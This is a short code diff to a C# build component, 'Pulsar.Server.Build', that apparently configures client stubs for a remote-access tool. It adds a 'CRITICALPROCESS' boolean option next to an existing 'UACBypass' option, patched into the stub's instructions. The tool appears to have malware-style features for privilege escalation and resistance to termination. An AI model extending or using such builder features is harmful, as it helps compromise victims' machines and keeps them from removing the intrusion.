@@ -210,6 +210,9 @@ namespace Pulsar.Server.Build
                                         case 11: // UACBypass
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.UACBypass));
                                             break;
+                                        case 12: // CRITICALPROCESS
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.CRITICALPROCESS));
+                                            break;
                                     }
                                     bools++;
                                 }
